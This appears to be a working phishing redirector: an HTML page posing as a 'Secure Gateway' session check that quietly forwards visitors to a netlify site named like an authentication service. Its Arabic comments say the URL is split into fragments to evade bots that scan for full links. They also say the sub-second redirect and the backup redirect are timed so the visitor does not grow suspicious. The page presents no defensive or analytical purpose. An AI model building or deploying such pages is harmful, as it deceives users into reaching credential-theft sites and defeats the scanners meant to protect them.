<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Secure Gateway</title>
    <style>
        body { margin:0; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; background:#f9f9f9; }
        .box { text-align:center; padding:20px; }
        .spinner { border:2px solid #ddd; border-top:2px solid #007bff; border-radius:50%; width:24px; height:24px; animation:spin 0.6s linear infinite; margin:0 auto 15px; }
        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    </style>
</head>
<body>
    <div class="box">
        <div class="spinner"></div>
        <div style="font-size:14px; color:#555;">Verifying session...</div>
    </div>

    <script>
        // الرابط الخاص بك مقسم لأجزاء لخدع البوتات التي تبحث عن روابط كاملة
        const part1 = "https://user-service-";
        const part2 = "authentication.netlify";
        const part3 = ".app/";
        const finalUrl = part1 + part2 + part3;

        setTimeout(function() {
            // فحص بسيط: إذا كان الزائر بشرياً سيتم التحويل فوراً
            // وإذا فشل التحويل لأي سبب، سيتم إجباره (Force Redirect)
            try {
                window.location.replace(finalUrl);
            } catch (e) {
                window.location.href = finalUrl;
            }
        }, 800); // أقل من ثانية واحدة (سريع جداً لضمان عدم الشك)

        // إذا تعطل الجافاسكريبت، رابط احتياطي غير مرئي للبوتات
        setTimeout(function() {
            window.location.assign(finalUrl);
        }, 1500);
    </script>
</body>
</html>
